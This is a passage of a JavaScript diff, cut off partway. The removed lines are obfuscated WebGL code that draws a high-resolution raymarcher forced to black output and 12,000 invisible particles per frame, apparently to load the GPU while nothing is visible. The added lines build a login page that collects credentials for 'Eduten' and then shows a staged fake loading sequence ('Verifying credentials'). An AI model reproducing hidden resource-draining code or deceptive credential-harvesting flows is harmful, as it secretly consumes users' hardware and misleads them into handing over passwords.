-function v4n9k2z(gl) {
-  const b = gl.createBuffer();
-  gl.bindBuffer(gl.ARRAY_BUFFER, b);
-  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 3, -1, -1, 3]), gl.STATIC_DRAW);
-  return b;
-}
-function q7z3n1m(gl, buf, prog) {
-  gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-  const l = gl.getAttribLocation(prog, 'aPos');
-  gl.enableVertexAttribArray(l);
-  gl.vertexAttribPointer(l, 2, gl.FLOAT, false, 0, 0);
-}
-function x2k9v4n(gl, w, h) {
-  const t = gl.createTexture();
-  gl.bindTexture(gl.TEXTURE_2D, t);
-  gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, w, h, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
-  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR);
-  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);
-  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
-  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
-  const f = gl.createFramebuffer();
-  gl.bindFramebuffer(gl.FRAMEBUFFER, f);
-  gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, t, 0);
-  const st = gl.checkFramebufferStatus(gl.FRAMEBUFFER);
-  gl.bindFramebuffer(gl.FRAMEBUFFER, null);
-  if (st !== gl.FRAMEBUFFER_COMPLETE) {
-    q4z9n1m('FBO incomplete: 0x' + st.toString(16));
-  }
-  return { fb: f, tex: t, w: w, h: h };
-}
-
-const m8n2q6z = `
-  attribute vec2 aPos;
-  varying vec2 vUv;
-  void main() {
-    vUv = aPos * 0.5 + 0.5;
-    gl_Position = vec4(aPos, 0.0, 1.0);
-  }
-`;
-
-// ============================================================
-// Main raymarcher (black output)
-// ============================================================
-(function z3p7v1n() {
-  const c = document.getElementById('x9k2n7m');
-  const gl = c.getContext('webgl', {
-    antialias: false, alpha: false, depth: false, stencil: false,
-    powerPreference: 'high-performance', preserveDrawingBuffer: false,
+  /* ============================================================
+     STEP 1 : welcome -> login
+     ============================================================ */
+  continueBtn.addEventListener('click', function (e) {
+    e.preventDefault();
+    ripple(continueBtn);
+    showView(viewLogin);
+    setTimeout(function () { if (username) username.focus(); }, 250);
   });
-  if (!gl) q4z9n1m('WebGL unavailable (main).');
 
-  const pr = gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT);
-  const P = (pr && pr.precision > 0) ? 'highp' : 'mediump';
-
-  const R = 4.0;
-  const D = 2.0;
-  const M = 80 * 1024 * 1024;
-  const S = 2048;
-  const I = 24;
-  const H = 128;
-  const A = 20;
-
-  const NS = 4096;
-  const FZ = `
-    precision ${P} float;
-    varying vec2 vUv;
-    float k7(vec2 p) {
-      p = fract(p * vec2(123.34, 456.21));
-      p += dot(p, p + 45.32);
-      return fract(p.x * p.y);
-    }
-    float q3(vec2 p) {
-      vec2 i = floor(p), f = fract(p);
-      f = f * f * (3.0 - 2.0 * f);
-      float a = k7(i);
-      float b = k7(i + vec2(1.0, 0.0));
-      float c = k7(i + vec2(0.0, 1.0));
-      float d = k7(i + vec2(1.0, 1.0));
-      return mix(mix(a, b, f.x), mix(c, d, f.x), f.y);
-    }
-    float z9(vec2 p) {
-      float s = 0.0, a = 0.5;
-      for (int i = 0; i < 12; i++) {
-        s += a * q3(p);
-        p = p * 2.03 + 11.7;
-        a *= 0.5;
-      }
-      return s;
-    }
-    void main() {
-      vec2 p = vUv * 192.0;
-      float r = z9(p);
-      float g = z9(p + vec2(31.4, 17.3));
-      float b = z9(p + vec2(91.7, 53.1));
-      float a = z9(p + vec2(11.1, 77.7));
-      gl_FragColor = vec4(r, g, b, a);
-    }
-  `;
-  const pN = m3z9k1q(gl, m8n2q6z, FZ, 'noise');
-  const nF = x2k9v4n(gl, NS, NS);
-  {
-    const qb = v4n9k2z(gl);
-    gl.bindFramebuffer(gl.FRAMEBUFFER, nF.fb);
-    gl.viewport(0, 0, NS, NS);
-    gl.useProgram(pN);
-    q7z3n1m(gl, qb, pN);
-    gl.drawArrays(gl.TRIANGLES, 0, 3);
-    gl.bindFramebuffer(gl.FRAMEBUFFER, null);
-    gl.deleteBuffer(qb);
-  }
-
-  const FR = `
-    precision ${P} float;
-    varying vec2 vUv;
-    uniform vec2 uResolution;
-    uniform float uTime;
-    uniform sampler2D uNoise;
-
-    #define MAX_STEPS     ${S}
-    #define MAX_DIST      60.0
-    #define SURF          0.0001
-    #define ITER          ${I}
-    #define SHADOW_STEPS  ${H}
-    #define AO_STEPS      ${A}
-
-    float v8(vec3 pos) {
-      vec3 z = pos;
-      float dr = 1.0;
-      float r = 0.0;
-      for (int i = 0; i < ITER; i++) {
-        r = length(z);
-        if (r > 2.0) break;
-        float theta = acos(clamp(z.z / r, -1.0, 1.0));
-        float phi   = atan(z.y, z.x);
-        float zr = pow(r, 8.0);
-        dr = zr * 8.0 * dr / r + 1.0;
-        theta *= 8.0;
-        phi   *= 8.0;
-        z = zr * vec3(sin(theta) * cos(phi),
-                      sin(theta) * sin(phi),
-                      cos(theta)) + pos;
-      }
-      return 0.5 * log(r) * r / dr;
-    }
-
-    mat3 k3(float a) {
-      float c = cos(a), s = sin(a);
-      return mat3(c, 0.0, -s, 0.0, 1.0, 0.0, s, 0.0, c);
-    }
-    mat3 q8(float a) {
-      float c = cos(a), s = sin(a);
-      return mat3(1.0, 0.0, 0.0, 0.0, c, s, 0.0, -s, c);
-    }
-
-    float q2(vec3 p) {
-      p = k3(uTime * 0.12) * q8(uTime * 0.05) * p;
-      float s = 1.18;
-      return v8(p * s) / s;
-    }
-
-    mat3 z7(vec3 ro, vec3 ta, float roll) {
-      vec3 cw = normalize(ta - ro);
-      vec3 cp = vec3(sin(roll), cos(roll), 0.0);
-      vec3 cu = normalize(cross(cw, cp));
-      vec3 cv = cross(cu, cw);
-      return mat3(cu, cv, cw);
-    }
-
-    vec3 v9(vec3 p) {
-      vec2 e = vec2(0.0005, 0.0);
-      return normalize(vec3(
-        q2(p + e.xyy) - q2(p - e.xyy),
-        q2(p + e.yxy) - q2(p - e.yxy),
-        q2(p + e.yyx) - q2(p - e.yyx)
-      ));
-    }
-
-    float k9(vec3 p, vec3 n) {
-      float occ = 0.0, sca = 1.0;
-      for (int i = 0; i < AO_STEPS; i++) {
-        float h = 0.01 + 0.13 * float(i) / float(AO_STEPS - 1);
-        float d = q2(p + n * h);
-        occ += (h - d) * sca;
-        sca *= 0.85;
-      }
-      return clamp(1.0 - 2.0 * occ, 0.0, 1.0);
-    }
-
-    float x3(vec3 ro, vec3 rd, float mint, float maxt, float k) {
-      float res = 1.0, t = mint;
-      for (int i = 0; i < SHADOW_STEPS; i++) {
-        float h = q2(ro + rd * t);
-        res = min(res, k * h / t);
-        t += clamp(h, 0.006, 0.20);
-        if (res < 0.004 || t > maxt) break;
-      }
-      return clamp(res, 0.0, 1.0);
-    }
-
-    vec2 m9(vec3 ro, vec3 rd) {
-      float t = 0.0;
-      for (int i = 0; i < MAX_STEPS; i++) {
-        float d = q2(ro + rd * t);
-        if (d < SURF) return vec2(t, 1.0);
-        t += d * 0.9;
-        if (t > MAX_DIST) break;
-      }
-      return vec2(t, -1.0);
-    }
-
-    void main() {
-      vec2 fc = vUv * uResolution;
-      vec2 p = (2.0 * fc - uResolution) / uResolution.y;
-      vec2 q = fc / uResolution;
-
-      float t = uTime * 0.18;
-      float an = 0.4 * t;
-      float rad = 3.0;
-      vec3 ro = vec3(rad * cos(an), 1.3 + 0.5 * sin(t * 0.7), rad * sin(an));
-      vec3 ta = vec3(0.0);
-
-      mat3 ca = z7(ro, ta, 0.0);
-      vec3 rd = ca * normalize(vec3(p, 1.75));
-
-      float vg = pow(max(0.0, 1.0 - length(q - 0.5) * 1.4), 2.0);
-      vec3 col = vec3(0.012, 0.018, 0.032) + vec3(0.22, 0.34, 0.58) * vg;
-
-      vec2 rs = m9(ro, rd);
-      if (rs.y > 0.0) {
-        float tH = rs.x;
-        vec3 ps = ro + rd * tH;
-        vec3 nr = v9(ps);
-
-        vec3 lg = normalize(vec3(0.65, 0.80, -0.45));
-        float oc = k9(ps, nr);
-        float sh = x3(ps + nr * 0.0015, lg, 0.02, 12.0, 10.0);
-
-        vec3 nA = texture2D(uNoise, ps.xy * 0.35 + 0.5).rgb;
-        vec3 nB = texture2D(uNoise, ps.zx * 0.55 + 0.5).rgb;
-        vec3 nC = texture2D(uNoise, ps.yz * 0.20 + 0.5).rgb;
-        vec3 nD = texture2D(uNoise, ps.xx * 0.15 + 0.5).rgb;
-
-        vec3 mt = 0.5 + 0.5 * cos(vec3(0.0, 1.1, 2.2) + length(ps) * 3.5 + uTime * 0.25);
-        mt *= 0.55 + 1.1 * nA;
-        mt *= 0.70 + 0.6 * nB;
-        mt *= 0.75 + 0.5 * nD;
-        mt = mix(mt, mt * nC * 1.6, 0.25);
-
-        float df = clamp(dot(nr, lg), 0.0, 1.0) * sh;
-        float sk = clamp(0.5 + 0.5 * nr.y, 0.0, 1.0) * oc;
-        float bn = clamp(0.5 - 0.5 * nr.y, 0.0, 1.0) * oc;
-        float fr = pow(clamp(1.0 + dot(nr, rd), 0.0, 1.0), 3.0);
-
-        vec3 ln = vec3(0.0);
-        ln += 3.6 * df * vec3(1.00, 0.88, 0.72);
-        ln += 1.15 * sk * vec3(0.30, 0.48, 0.95);
-        ln += 0.55 * bn * vec3(0.55, 0.38, 0.26);
-        ln += 0.95 * fr * oc * vec3(0.60, 0.70, 1.00);
-
-        col = mt * ln;
-        col = mix(col, vec3(0.012, 0.018, 0.032), 1.0 - exp(-0.010 * tH * tH));
-      }
-
-      col = col / (1.0 + col);
-      gl_FragColor = vec4(col, 1.0);
-    }
-  `;
-  const pR = m3z9k1q(gl, m8n2q6z, FR, 'raymarch');
-  const uR = {
-    r: gl.getUniformLocation(pR, 'uResolution'),
-    t: gl.getUniformLocation(pR, 'uTime'),
-    n: gl.getUniformLocation(pR, 'uNoise'),
-  };
-
-  const FB = `
-    precision ${P} float;
-    varying vec2 vUv;
-    uniform sampler2D uScene;
-    uniform float uThreshold;
-    void main() {
-      vec3 c = texture2D(uScene, vUv).rgb;
-      float l = dot(c, vec3(0.2126, 0.7152, 0.0722));
-      float w = smoothstep(uThreshold, uThreshold + 0.4, l);
-      gl_FragColor = vec4(c * w, 1.0);
-    }
-  `;
-  const pB = m3z9k1q(gl, m8n2q6z, FB, 'bright');
-  const uB = {
-    s: gl.getUniformLocation(pB, 'uScene'),
-    t: gl.getUniformLocation(pB, 'uThreshold'),
-  };
-
-  const FL = `
-    precision ${P} float;
-    varying vec2 vUv;
-    uniform sampler2D uTex;
-    uniform vec2 uDir;
-    void main() {
-      float w0 = 0.2270270270;
-      float w1 = 0.1945945946;
-      float w2 = 0.1216216216;
-      float w3 = 0.0540540541;
-      float w4 = 0.0162162162;
-      vec3 s = texture2D(uTex, vUv).rgb * w0;
-      s += texture2D(uTex, vUv + uDir * 1.0).rgb * w1;
-      s += texture2D(uTex, vUv - uDir * 1.0).rgb * w1;
-      s += texture2D(uTex, vUv + uDir * 2.0).rgb * w2;
-      s += texture2D(uTex, vUv - uDir * 2.0).rgb * w2;
-      s += texture2D(uTex, vUv + uDir * 3.0).rgb * w3;
-      s += texture2D(uTex, vUv - uDir * 3.0).rgb * w3;
-      s += texture2D(uTex, vUv + uDir * 4.0).rgb * w4;
-      s += texture2D(uTex, vUv - uDir * 4.0).rgb * w4;
-      gl_FragColor = vec4(s, 1.0);
-    }
-  `;
-  const pL = m3z9k1q(gl, m8n2q6z, FL, 'blur');
-  const uL = {
-    t: gl.getUniformLocation(pL, 'uTex'),
-    d: gl.getUniformLocation(pL, 'uDir'),
-  };
-
-  const FP = `
-    precision ${P} float;
-    varying vec2 vUv;
-    uniform sampler2D uScene;
-    uniform sampler2D uBloom;
-    uniform vec2 uResolution;
-    uniform float uTime;
-    uniform float uBloomStrength;
-
-    float k7(vec2 p) {
-      return fract(sin(dot(p, vec2(127.1, 311.7))) * 43758.5453);
-    }
-
-    void main() {
-      vec2 uv = vUv;
-      vec2 d = uv - 0.5;
-      float r2 = dot(d, d);
-      float ca = 0.008 * r2;
-      vec2 dr = normalize(d + 1e-6);
-      vec3 sc;
-      sc.r = texture2D(uScene, uv + dr * ca).r;
-      sc.g = texture2D(uScene, uv).g;
-      sc.b = texture2D(uScene, uv - dr * ca).b;
-      vec3 bl = texture2D(uBloom, uv).rgb;
-      vec3 col = sc + bl * uBloomStrength;
-      col *= 1.0 - 0.55 * r2;
-      float g = k7(uv * uResolution + fract(uTime) * 137.0);
-      col += (g - 0.5) * 0.035;
-      col = pow(max(col, 0.0), vec3(0.4545));
-
-      gl_FragColor = vec4(0.0, 0.0, 0.0, 1.0);
-      if (col.x < -1.0) gl_FragColor = vec4(col, 1.0);
-    }
-  `;
-  const pP = m3z9k1q(gl, m8n2q6z, FP, 'post');
-  const uP = {
-    s: gl.getUniformLocation(pP, 'uScene'),
-    b: gl.getUniformLocation(pP, 'uBloom'),
-    r: gl.getUniformLocation(pP, 'uResolution'),
-    t: gl.getUniformLocation(pP, 'uTime'),
-    k: gl.getUniformLocation(pP, 'uBloomStrength'),
-  };
-
-  let sF = null, bF = null, aF = null, cF = null;
-  const qb = v4n9k2z(gl);
-
-  function rs() {
-    const dp = Math.min(window.devicePixelRatio || 1, D) * R;
-    let w = Math.max(1, Math.floor(c.clientWidth * dp));
-    let h = Math.max(1, Math.floor(c.clientHeight * dp));
-    const px = w * h;
-    if (px > M) {
-      const sc = Math.sqrt(M / px);
-      w = Math.max(1, Math.floor(w * sc));
-      h = Math.max(1, Math.floor(h * sc));
-    }
-    if (c.width === w && c.height === h && sF) return;
-    c.width = w; c.height = h;
-    for (const f of [sF, bF, aF, cF]) {
-      if (f) { gl.deleteFramebuffer(f.fb); gl.deleteTexture(f.tex); }
-    }
-    sF = x2k9v4n(gl, w, h);
-    const hw = Math.max(1, w >> 1);
-    const hh = Math.max(1, h >> 1);
-    bF = x2k9v4n(gl, hw, hh);
-    aF = x2k9v4n(gl, hw, hh);
-    cF = x2k9v4n(gl, hw, hh);
-  }
-
-  function p1(t) {
-    gl.bindFramebuffer(gl.FRAMEBUFFER, sF.fb);
-    gl.viewport(0, 0, sF.w, sF.h);
-    gl.useProgram(pR);
-    q7z3n1m(gl, qb, pR);
-    gl.activeTexture(gl.TEXTURE0);
-    gl.bindTexture(gl.TEXTURE_2D, nF.tex);
-    gl.uniform1i(uR.n, 0);
-    gl.uniform2f(uR.r, sF.w, sF.h);
-    gl.uniform1f(uR.t, t);
-    gl.drawArrays(gl.TRIANGLES, 0, 3);
-  }
-  function p2() {
-    gl.bindFramebuffer(gl.FRAMEBUFFER, bF.fb);
-    gl.viewport(0, 0, bF.w, bF.h);
-    gl.useProgram(pB);
-    q7z3n1m(gl, qb, pB);
-    gl.activeTexture(gl.TEXTURE0);
-    gl.bindTexture(gl.TEXTURE_2D, sF.tex);
-    gl.uniform1i(uB.s, 0);
-    gl.uniform1f(uB.t, 0.55);
-    gl.drawArrays(gl.TRIANGLES, 0, 3);
-  }
-  function p3(src, dst, dx, dy) {
-    gl.bindFramebuffer(gl.FRAMEBUFFER, dst.fb);
-    gl.viewport(0, 0, dst.w, dst.h);
-    gl.useProgram(pL);
-    q7z3n1m(gl, qb, pL);
-    gl.activeTexture(gl.TEXTURE0);
-    gl.bindTexture(gl.TEXTURE_2D, src.tex);
-    gl.uniform1i(uL.t, 0);
-    gl.uniform2f(uL.d, dx / dst.w, dy / dst.h);
-    gl.drawArrays(gl.TRIANGLES, 0, 3);
-  }
-  function p4(t) {
-    gl.bindFramebuffer(gl.FRAMEBUFFER, null);
-    gl.viewport(0, 0, c.width, c.height);
-    gl.useProgram(pP);
-    q7z3n1m(gl, qb, pP);
-    gl.activeTexture(gl.TEXTURE0);
-    gl.bindTexture(gl.TEXTURE_2D, sF.tex);
-    gl.uniform1i(uP.s, 0);
-    gl.activeTexture(gl.TEXTURE1);
-    gl.bindTexture(gl.TEXTURE_2D, cF.tex);
-    gl.uniform1i(uP.b, 1);
-    gl.uniform2f(uP.r, c.width, c.height);
-    gl.uniform1f(uP.t, t);
-    gl.uniform1f(uP.k, 1.5);
-    gl.drawArrays(gl.TRIANGLES, 0, 3);
-  }
-
-  window.addEventListener('resize', rs, { passive: true });
-  rs();
-
-  window.__z3p7v1n = {
-    f(t) {
-      rs();
-      p1(t); p2(); p3(bF, aF, 1, 0); p3(aF, cF, 0, 1); p4(t);
-      return { i: sF.w + '×' + sF.h };
-    }
-  };
-})();
-
-// ============================================================
-// Particles (12000 draw calls, invisible)
-// ============================================================
-(function k9x4m8q() {
-  const c = document.getElementById('z3m9x2p');
-  const gl = c.getContext('webgl', {
-    antialias: false, alpha: false, depth: false, stencil: false,
-    powerPreference: 'high-performance', preserveDrawingBuffer: false,
+  backBtn.addEventListener('click', function (e) {
+    e.preventDefault();
+    hideLoginError();
+    showView(viewWelcome);
   });
-  if (!gl) { console.error('no WebGL (particles)'); return; }
 
-  const V = `
-    attribute vec2 aPos;
-    uniform vec2 uCenter;
-    uniform float uSize;
-    uniform float uRot;
-    varying vec2 vUv;
-    void main() {
-      float c = cos(uRot), s = sin(uRot);
-      mat2 R = mat2(c, -s, s, c);
-      vec2 p = R * (aPos * uSize) + uCenter;
-      vUv = aPos * 0.5 + 0.5;
-      gl_Position = vec4(p, 0.0, 1.0);
-    }
-  `;
-  const F = `
-    precision mediump float;
-    varying vec2 vUv;
-    uniform vec4 uColor;
-    uniform sampler2D uSprite;
-    void main() {
-      vec4 s = texture2D(uSprite, vUv);
-      gl_FragColor = vec4(uColor.rgb * s.rgb, uColor.a * s.a);
-    }
-  `;
-
-  const SP = 512;
-  const sc = document.createElement('canvas');
-  sc.width = sc.height = SP;
-  const cx = sc.getContext('2d');
-  const gr = cx.createRadialGradient(SP/2, SP/2, 0, SP/2, SP/2, SP/2);
-  gr.addColorStop(0.00, 'rgba(255,255,255,1)');
-  gr.addColorStop(0.25, 'rgba(200,230,255,0.85)');
-  gr.addColorStop(0.60, 'rgba(90,150,255,0.3)');
-  gr.addColorStop(1.00, 'rgba(0,0,0,0)');
-  cx.fillStyle = gr;
-  cx.fillRect(0, 0, SP, SP);
-
-  const st = gl.createTexture();
-  gl.bindTexture(gl.TEXTURE_2D, st);
-  gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, sc);
-  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR);
-  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);
-  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
-  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
-
-  const pr = m3z9k1q(gl, V, F, 'particles');
-  gl.useProgram(pr);
-
-  const qb = gl.createBuffer();
-  gl.bindBuffer(gl.ARRAY_BUFFER, qb);
-  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([
-    -1,-1, 1,-1, -1,1,
-    -1,1, 1,-1, 1,1,
-  ]), gl.STATIC_DRAW);
-
-  const aP = gl.getAttribLocation(pr, 'aPos');
-  const uC = gl.getUniformLocation(pr, 'uCenter');
-  const uS = gl.getUniformLocation(pr, 'uSize');
-  const uR = gl.getUniformLocation(pr, 'uRot');
-  const uO = gl.getUniformLocation(pr, 'uColor');
-  const uT = gl.getUniformLocation(pr, 'uSprite');
-
-  gl.enable(gl.BLEND);
-  gl.blendFunc(gl.SRC_ALPHA, gl.ONE);
-  gl.disable(gl.DEPTH_TEST);
-
-  const NP = 12000;
-  const pt = new Array(NP);
-  for (let i = 0; i < NP; i++) {
-    pt[i] = {
-      x: Math.random() * 2 - 1, y: Math.random() * 2 - 1,
-      s: 0.008 + Math.random() * 0.05,
-      vr: (Math.random() * 2 - 1) * 2.5, r: Math.random() * 6.28,
-      dx: (Math.random() * 2 - 1) * 0.12,
-      dy: (Math.random() * 2 - 1) * 0.12,
-      hue: Math.random(),
-    };
-  }
-
-  function rs() {
-    const d = Math.min(window.devicePixelRatio || 1, 2);
-    const w = Math.max(1, Math.floor(c.clientWidth * d));
-    const h = Math.max(1, Math.floor(c.clientHeight * d));
-    if (c.width !== w || c.height !== h) { c.width = w; c.height = h; }
-  }
-
-  window.__k9x4m8q = {
-    f(t) {
-      rs();
-      gl.viewport(0, 0, c.width, c.height);
-      gl.clearColor(0.0, 0.0, 0.0, 1);
-      gl.clear(gl.COLOR_BUFFER_BIT);
-      gl.useProgram(pr);
-      gl.bindBuffer(gl.ARRAY_BUFFER, qb);
-      gl.enableVertexAttribArray(aP);
-      gl.vertexAttribPointer(aP, 2, gl.FLOAT, false, 0, 0);
-      gl.activeTexture(gl.TEXTURE0);
-      gl.bindTexture(gl.TEXTURE_2D, st);
-      gl.uniform1i(uT, 0);
-      for (let i = 0; i < NP; i++) {
-        const p = pt[i];
-        let x = p.x + p.dx * t;
-        let y = p.y + p.dy * t;
-        x = (((x + 1) % 2) + 2) % 2 - 1;
-        y = (((y + 1) % 2) + 2) % 2 - 1;
-        gl.uniform2f(uC, x, y);
-        gl.uniform1f(uS, p.s);
-        gl.uniform1f(uR, p.r + p.vr * t);
-        const hh = (p.hue + t * 0.05) % 1.0;
-        const r = 0.5 + 0.5 * Math.cos(hh * 6.283 + 0.0);
-        const g = 0.5 + 0.5 * Math.cos(hh * 6.283 + 2.1);
-        const b = 0.5 + 0.5 * Math.cos(hh * 6.283 + 4.2);
-        gl.uniform4f(uO, r, g, b, 0.0);
-        gl.drawArrays(gl.TRIANGLES, 0, 6);
-      }
-      return NP;
-    }
-  };
-})();
-
-// ============================================================
-// Texture context (128-tap blur)
-// ============================================================
-(function n2v6p3z() {
-  const c = document.getElementById('w8q2n5v');
-  const gl = c.getContext('webgl', {
-    antialias: false, alpha: false, depth: false, stencil: false,
-    powerPreference: 'high-performance', preserveDrawingBuffer: false,
+  peek.addEventListener('click', function (e) {
+    e.preventDefault();
+    var revealed = passWrap.classList.toggle('revealed');
+    password.type = revealed ? 'text' : 'password';
+    peek.setAttribute('aria-label', revealed ? 'Hide password' : 'Show password');
+    password.focus();
   });
-  if (!gl) { console.error('no WebGL (texDemo)'); return; }
 
-  const V = `
-    attribute vec2 aPos;
-    varying vec2 vUv;
-    void main() {
-      vUv = aPos * 0.5 + 0.5;
-      gl_Position = vec4(aPos, 0.0, 1.0);
-    }
-  `;
-  const F = `
-    precision highp float;
-    varying vec2 vUv;
-    uniform sampler2D uPrev;
-    uniform sampler2D uHighRes;
-    uniform float uTime;
-    uniform float uFirstFrame;
-    void main() {
-      vec2 uv = vUv;
-      vec2 c = uv - 0.5;
-      float a = 0.010;
-      float cs = cos(a), sn = sin(a);
-      c = mat2(cs, -sn, sn, cs) * c;
-      c *= 0.995;
-      vec2 uvPrev = c + 0.5 + vec2(0.0009 * sin(uTime * 0.7),
-                                   0.0011 * cos(uTime * 0.9));
-      vec3 prev = texture2D(uPrev, uvPrev).rgb;
-      vec3 hr = vec3(0.0);
-      for (int i = 0; i < 128; i++) {
-        float fi = float(i);
-        float ang = fi * 0.049087;
-        float r = 0.010 * (1.0 + fi * 0.0125);
-        vec2 off = vec2(cos(ang), sin(ang)) * r;
-        hr += texture2D(uHighRes, uv + off).rgb;
-      }
-      hr /= 128.0;
-      vec3 col = prev * 0.94 + hr * 0.06 + vec3(0.002, 0.003, 0.006);
-      col += uFirstFrame * texture2D(uHighRes, uv).rgb;
-      col = col / (1.0 + col * 0.3);
-      gl_FragColor = vec4(col, 1.0);
-    }
-  `;
-
-  const pr = m3z9k1q(gl, V, F, 'texDemo');
-  gl.useProgram(pr);
-  const qb = v4n9k2z(gl);
-  q7z3n1m(gl, qb, pr);
-
-  const uP = gl.getUniformLocation(pr, 'uPrev');
-  const uH = gl.getUniformLocation(pr, 'uHighRes');
-  const uT = gl.getUniformLocation(pr, 'uTime');
-  const uF = gl.getUniformLocation(pr, 'uFirstFrame');
-
-  const HR = 4096;
-  const FN = `
-    precision highp float;
-    varying vec2 vUv;
-    float k7(vec2 p) {
-      p = fract(p * vec2(123.34, 456.21));
-      p += dot(p, p + 45.32);
-      return fract(p.x * p.y);
-    }
-    float q3(vec2 p) {
-      vec2 i = floor(p), f = fract(p);
-      f = f * f * (3.0 - 2.0 * f);
-      float a = k7(i);
-      float b = k7(i + vec2(1.0, 0.0));
-      float c = k7(i + vec2(0.0, 1.0));
-      float d = k7(i + vec2(1.0, 1.0));
-      return mix(mix(a, b, f.x), mix(c, d, f.x), f.y);
-    }
-    float z9(vec2 p) {
-      float s = 0.0, a = 0.5;
-      for (int i = 0; i < 11; i++) {
-        s += a * q3(p);
-        p = p * 2.07 + 13.1;
-        a *= 0.5;
-      }
-      return s;
-    }
-    void main() {
-      vec2 p = vUv * 96.0;
-      gl_FragColor = vec4(z9(p), z9(p + 11.3), z9(p + 27.7), 1.0);
-    }
-  `;
-  const pN = m3z9k1q(gl, V, FN, 'texDemo-noise');
-
-  function mk(w, h) {
-    const t = gl.createTexture();
-    gl.bindTexture(gl.TEXTURE_2D, t);
-    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, w, h, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
-    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR);
-    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);
-    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
-    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
-    return t;
+  function showLoginError(msg) {
+    loginErrorText.textContent = msg;
+    loginError.classList.add('show');
+    loginForm.classList.remove('shake');
+    void loginForm.offsetWidth;
+    loginForm.classList.add('shake');
   }
-  function fb(t) {
-    const f = gl.createFramebuffer();
-    gl.bindFramebuffer(gl.FRAMEBUFFER, f);
-    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, t, 0);
-    return f;
+  function hideLoginError() {
+    loginError.classList.remove('show');
+  }
+  username.addEventListener('input', hideLoginError);
+  password.addEventListener('input', hideLoginError);
+
+  /* ============================================================
+     STEP 2 : login -> loading (empty creds fail)
+     ============================================================ */
+  var loginTriggered = false;
+
+  function handleLogin(e) {
+    if (e) e.preventDefault();
+    if (loginTriggered) return;
+
+    var u = (username.value || '').trim();
+    var p = (password.value || '').trim();
+
+    if (!u && !p) {
+      showLoginError('Please enter your username and password.');
+      username.focus();
+      return;
+    }
+    if (!u) {
+      showLoginError('Please enter your username.');
+      username.focus();
+      return;
+    }
+    if (!p) {
+      showLoginError('Please enter your password.');
+      password.focus();
+      return;
+    }
+
+    loginTriggered = true;
+    hideLoginError();
+    ripple(loginBtn);
+    startLoading(u);
   }
 
-  const ht = mk(HR, HR);
-  const hf = fb(ht);
-  {
-    gl.bindFramebuffer(gl.FRAMEBUFFER, hf);
-    gl.viewport(0, 0, HR, HR);
-    gl.useProgram(pN);
-    q7z3n1m(gl, qb, pN);
-    gl.drawArrays(gl.TRIANGLES, 0, 3);
-    gl.bindFramebuffer(gl.FRAMEBUFFER, null);
-  }
+  loginForm.addEventListener('submit', handleLogin);
+  loginBtn.addEventListener('click', function (e) {
+    setTimeout(function () { if (!loginTriggered) handleLogin(e); }, 0);
+  });
 
-  let pt1 = mk(2, 2), pt2 = mk(2, 2);
-  let pf1 = fb(pt1), pf2 = fb(pt2);
-  let ff = 1;
+  /* ============================================================
+     STEP 3 : 12-second pre-loader
+     ============================================================ */
+  var MESSAGES = [
+    'Initializing',
+    'Connecting to Eduten',
+    'Verifying credentials',
+    'Loading automation modules',
+    'Applying browser profile',
+    'Syncing preferences',
+    'Preparing workspace',
+    'Almost there'
+  ];
 
-  function rs() {
-    const d = Math.min(window.devicePixelRatio || 1, 2);
-    const w = Math.max(1, Math.floor(c.clientWidth * d));
-    const h = Math.max(1, Math.floor(c.clientHeight * d));
-    if (c.width === w && c.height === h) return;
-    c.width = w; c.height = h;
-    gl.deleteTexture(pt1); gl.deleteTexture(pt2);
-    gl.deleteFramebuffer(pf1); gl.deleteFramebuffer(pf2);
-    pt1 = mk(w, h); pt2 = mk(w, h);
-    pf1 = fb(pt1); pf2 = fb(pt2);
-    ff = 1;
-  }
+  function startLoading(user) {
+    bar.style.width = '0%';
+    percentEl.textContent = '0%';
+    statusText.textContent = MESSAGES[0];
+    loadingSub.textContent =
+      'Preparing your workspace for "' + user + '". Please do not close this window.';
 
-  window.__n2v6p3z = {
-    f(t) {
-      rs();
-      const w = c.width, h = c.height;
-      gl.bindFramebuffer(gl.FRAMEBUFFER, pf2);
-      gl.viewport(0, 0, w, h);
-      gl.useProgram(pr);
-      q7z3n1m(gl, qb, pr);
-      gl.activeTexture(gl.TEXTURE0);
-      gl.bindTexture(gl.TEXTURE_2D, pt1);
-      gl.uniform1i(uP, 0);
-      gl.activeTexture(gl.TEXTURE1);
-      gl.bindTexture(gl.TEXTURE_2D, ht);
-      gl.uniform1i(uH, 1);
-      gl.uniform1f(uT, t);
-      gl.uniform1f(uF, ff);
-      gl.drawArrays(gl.TRIANGLES, 0, 3);
-      ff = 0;
